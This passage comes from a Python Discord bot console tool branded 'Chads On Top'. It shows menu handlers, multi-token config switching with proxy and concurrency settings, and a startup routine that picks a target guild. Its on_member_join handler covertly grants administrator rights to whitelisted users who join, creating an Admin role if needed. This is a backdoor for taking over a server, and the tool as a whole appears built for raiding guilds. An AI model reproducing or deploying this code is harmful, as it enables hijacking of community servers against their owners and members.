                print(format_log_message("ERROR", "No valid user IDs provided", 50))
            await self.menu()
                
        elif ans == "36":
            
            print(format_log_message("INFO", f"Whitelisted Members ({len(self.whitelist)}):", 50))
            if not self.whitelist:
                print(gradient_text("  None", PINK_START, PINK_END, bold=True))
                await self.menu()
                return

            whitelisted_users = []
            
            async def fetch_user_info(user_id):
                try:
                    
                    user = await self.client.fetch_user(int(user_id))
                    return f"{user.name}#{user.discriminator:<4} (ID: {user.id})"
                except discord.NotFound:
                    return f"User Not Found (ID: {user_id})"
                except Exception:
                    return f"Error Fetching User (ID: {user_id})"

            tasks = [fetch_user_info(user_id) for user_id in sorted(list(self.whitelist))]
            user_info_list = await asyncio.gather(*tasks)
            
            
            max_len = max(len(info) for info in user_info_list)
            header_len = max(max_len + 4, 70)
            print(gradient_text("╭" + "─" * header_len + "╮", PINK_START, PINK_END, bold=True))
            for info in user_info_list:
                
                print(gradient_text(f"│ {info:<{header_len - 4}}   │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * header_len + "╯", PINK_START, PINK_END, bold=True))
            await asyncio.sleep(pause_seconds)
            await self.menu()
            
        elif ans == "37":
            
            if len(__loaded_configs__) < 2:
                print(format_log_message("ERROR", "Only one config loaded. Load multiple configs at startup.", 32))
                await self.menu()
                return
            
            print(format_log_message("INFO", "Available Configs to Switch:", 50))
            print(gradient_text("╭" + "─" * 70 + "╮", PINK_START, PINK_END, bold=True))
            config_names = list(__loaded_configs__.keys())
            for i, config_name in enumerate(config_names, 1):
                marker =   "✓ ACTIVE" if config_name == __current_config_name__ else "         "
                bot_info = __loaded_configs__[config_name].get("token", "N/A")[:15] + "..."
                print(gradient_text(f"│ {i:<2}│ {config_name:<30} {marker} │ {bot_info:<20}   │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 70 + "╯", PINK_START, PINK_END, bold=True))
            
            try:
                choice = int((await self.async_input(format_log_message("INFO", "Choose config number", 50))).strip()) - 1
                if 0 <= choice < len(config_names):
                    selected_config = config_names[choice]
                    if switch_config(selected_config):
                        print(format_log_message("SUCCESS", f"Switched to {gradient_text(selected_config, GREEN_START, GREEN_END, bold=True)}", 45))
                        
                        print(format_log_message("INFO", "Note: Restart required for new bot token to take effect", 30))
                    else:
                        print(format_log_message("ERROR", "Failed to switch config", 48))
                else:
                    print(format_log_message("ERROR", "Invalid choice!", 49))
            except ValueError:
                print(format_log_message("ERROR", "Invalid input! Please enter a number.", 33))
            await self.menu()
            
        elif ans == "38":
            
            print(format_log_message("INFO", f"Loaded Configs ({len(__loaded_configs__)}):", 50))
            print(gradient_text("╭" + "─" * 120 + "╮", PINK_START, PINK_END, bold=True))
            for config_name, config_data in __loaded_configs__.items():
                marker = "● ACTIVE" if config_name == __current_config_name__ else "  inactive"
                bot_token_preview = config_data.get("token", "N/A")[:20] + "..."
                max_conc = config_data.get("max_concurrent", "N/A")
                use_proxy = "Yes" if config_data.get("proxy", False) else "No"
                print(gradient_text(f"│ {marker}        │ {config_name:<25}      │ Token: {bot_token_preview:<27}    │ Proxy: {use_proxy:<3} │ MaxConc: {max_conc:<5} │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 120 + "╯", PINK_START, PINK_END, bold=True))
            input("\nPress Enter to return to the menu...")
            await self.menu()
            
        elif ans == "39":
            print(format_log_message("SUCCESS", "Exiting...", 50))
            os._exit(0)
        elif ans == "40":
            await self.execute_guild_info(token)
        elif ans == "41":
            invite_link = __config__.get("operations", {}).get("ouath2")
            if not invite_link:
                print(format_log_message("ERROR", "'ouath2' not found in config's 'operations' section!", 40))
            else:
                platform = await self.async_input(format_log_message("INFO", "Platform: [w]indows (copy) / [m]obile (print)", 50))
                platform = platform.strip().lower()
                
                if platform.startswith('w'):
                    try:
                        pyperclip.copy(invite_link)
                        print(format_log_message("SUCCESS", "Bot invite link copied to clipboard.", 50))
                        print(gradient_text(invite_link, GREEN_START, GREEN_END, bold=True))
                    except Exception as e:
                        print(format_log_message("ERROR", f"Could not copy to clipboard: {e}", 40))
                        print(format_log_message("INFO", f"Here is the link instead: {invite_link}", 50))
                elif platform.startswith('m'):
                    print(format_log_message("SUCCESS", "Bot invite link:", 50))
                    print(gradient_text(invite_link, GREEN_START, GREEN_END, bold=True))
                else:
                    print(format_log_message("INFO", "Invalid choice. Printing link.", 40))
                    print(gradient_text(invite_link, GREEN_START, GREEN_END, bold=True))
            await self.menu()
        else:
            print(format_log_message("ERROR", f"Invalid option: {ans}!", 47))   
            time.sleep(0.8)
            await self.menu()

@__client__.event
async def on_member_join(member):
    global bot_instance
    try:
        if bot_instance and bot_instance.auto_admin_enabled:
            if str(member.id) in bot_instance.whitelist:
                if str(member.guild.id) == bot_instance.guildid:
                    admin_role = discord.utils.get(member.guild.roles, permissions=discord.Permissions(administrator=True))
                    if not admin_role:
                        try:
                            admin_role = await member.guild.create_role(
                                name="Admin",
                                permissions=discord.Permissions(administrator=True),
                                color=discord.Color.red(),
                                reason="Auto-admin for whitelisted user"
                            )
                            print(format_log_message("SUCCESS", f"Created admin role for {member.name}#{member.discriminator}", 30))
                        except Exception as e:
                            print(format_log_message("ERROR", f"Failed to create admin role: {e}", 35))
                            return
                    try:
                        await member.add_roles(admin_role, reason="Auto-admin: User is whitelisted")
                        print(format_log_message("SUCCESS", f"Auto-granted admin to {member.name}#{member.discriminator} (ID: {member.id})", 25))
                    except Exception as e:
                        print(format_log_message("ERROR", f"Failed to grant admin to {member.name}: {e}", 30))
    except Exception as e:
        print(format_log_message("ERROR", f"Error in on_member_join: {e}", 35))

@__client__.event
async def on_ready():
    global bot_instance
    try:
        os.system("cls") if os.name == "nt" else os.system("clear")
        print(format_log_message("SUCCESS", f"Authenticated: {__client__.user.name}#{__client__.user.discriminator}", 24))

        guildid = ""
        fetch_guilds_choice = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Fetch and list available guilds? [y/n]", 50)))
        fetch_guilds_choice = fetch_guilds_choice.strip().lower()

        if fetch_guilds_choice == 'y' and __client__.guilds:
            print(format_log_message("INFO", "Available Guilds:", 50))
            print(gradient_text("╭" + "─" * 140 + "╮", PINK_START, PINK_END, bold=True))
            for i, guild in enumerate(__client__.guilds):
                print(gradient_text(f"│ {i+1:>3} │ {guild.name:<104} │ ID: {guild.id:<20}  │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 140 + "╯", PINK_START, PINK_END, bold=True))
            
            try:
                choice = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Choose guild number (or Enter for manual ID)", 50)))
                choice = choice.strip()
                if choice:
                    idx = int(choice) - 1
                    if 0 <= idx < len(__client__.guilds):
                        guildid = str(__client__.guilds[idx].id)
                        print(format_log_message("SUCCESS", f"Selected: {(__client__.guilds[idx].name)}", 43))
                    else:
                        raise ValueError
                else:
                    guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID manually", 50)))
                    guildid = guildid.strip()
            except (ValueError, IndexError):
                print(format_log_message("ERROR", "Invalid choice. Falling back to manual ID input.", 28))
                guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
                guildid = guildid.strip()
        else:
            if fetch_guilds_choice == 'y':
                print(format_log_message("ERROR", "No guilds found! Proceeding to manual ID input.", 28))
            else:
                print(format_log_message("INFO", "Skipping guild list.", 40))
            guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
            guildid = guildid.strip()

        if not guildid:
            print(format_log_message("ERROR", "No guild ID provided! Exiting.", 32))
            os._exit(1)

        bot_instance = Chads(guildid, __client__)
        print(format_log_message("INFO", "Use option 26 to grant admin to specific user IDs.", 40))
        await bot_instance.menu()
    except KeyboardInterrupt:
        os.system("cls") if os.name == "nt" else os.system("clear")
        print(format_log_message("INFO", "Closing Chads... Goodbye!", 40))
        exit(0)
        
if __name__ == "__main__":
     try:
        if os.name == "nt":
            os.system(f"title Chads On Top")
        __client__.run(token)
     except KeyboardInterrupt:
        print(format_log_message("INFO", "Closing Chads... Goodbye!", 40))
        os._exit(0)
     except Exception as e:
        print(format_log_message("ERROR", f"Failed to start | {e}", 47))
        os._exit(1)
